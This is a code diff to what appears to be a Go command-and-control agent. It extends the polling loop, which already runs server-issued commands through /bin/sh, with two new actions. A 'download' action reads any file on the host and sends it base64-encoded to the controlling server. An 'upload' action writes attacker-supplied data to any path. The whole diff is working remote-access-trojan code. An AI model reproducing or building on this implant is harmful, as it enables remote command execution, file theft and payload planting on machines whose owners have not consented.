@@ -7,9 +7,11 @@ import (
 	"io"
 	"net/http"
 	"os/exec"
+	"os"
+	"encoding/base64"
 	"math/rand"
 	"time"
-	// "github.com/coder/websocket"
+	"strings"
 )
 
 const (
@@ -119,29 +121,67 @@ func main() {
 
 
 
-		//exec assinged task
 		if pollResp.Status == "task_assigned" && pollResp.Command != "" {
 			fmt.Printf("[+] Received command: %s\n", pollResp.Command)
 
-			//exec comand 
-			cmd := exec.Command("/bin/sh", "-c", pollResp.Command)
-			var out bytes.Buffer
-			cmd.Stdout = &out
-			cmd.Stderr = &out
 
-			err := cmd.Run()
-			outputStr := out.String()
-			if err != nil {
-				outputStr += fmt.Sprintf("\n[-] Execution error: %v", err)
+			var outputStr string
+
+            parts := strings.SplitN(pollResp.Command, " ", 3)
+            actionType := parts[0]
+
+			if actionType == "download" && len(parts) >= 2 {
+				filePath := parts[1]
+				fileData, err := os.ReadFile(filePath)
+				if err != nil {
+					outputStr = fmt.Sprintf("[-] Error reading file: %v", err)
+				} else {
+					encoded := base64.StdEncoding.EncodeToString(fileData)
+					outputStr = fmt.Sprintf("[DOWNLOAD_SUCCESS]|%s", encoded)
+				}
+
+				sendOutput(AgentID, outputStr)
+
+			} else if actionType == "upload" && len(parts) >= 3 {
+				destPath := parts[1]
+				fileDataBase64 := parts[2]
+
+				fileData, err := base64.StdEncoding.DecodeString(fileDataBase64)
+				if err != nil {
+					outputStr = fmt.Sprintf("[-] Error decoding base64: %v", err)
+				} else {
+					err = os.WriteFile(destPath, fileData, 0644)
+					if err != nil {
+						outputStr = fmt.Sprintf("[-] Error w file on disk: %v", err)
+					} else {
+						outputStr = fmt.Sprintf("[+] Upload completed successfully %s", destPath)
+					}
+				}
+
+
+				sendOutput(AgentID, outputStr)
+
+			} else{
+				//exec comand 
+				cmd := exec.Command("/bin/sh", "-c", pollResp.Command)
+				var out bytes.Buffer
+				cmd.Stdout = &out
+				cmd.Stderr = &out
+
+				err := cmd.Run()
+				outputStr = out.String()
+				if err != nil {
+					outputStr += fmt.Sprintf("\n[-] Execution error: %v", err)
+				}
+
+				//no output
+				if outputStr == "" {
+					outputStr = "[+] Command executed successfully (no output)."
+				}
+
+				//send output to server
+				sendOutput(AgentID, outputStr)
 			}
-
-			//no output
-			if outputStr == "" {
-				outputStr = "[+] Command executed successfully (no output)."
-			}
-
-			//send output to server
-			sendOutput(AgentID, outputStr)
 		}
 
 		//poll delay
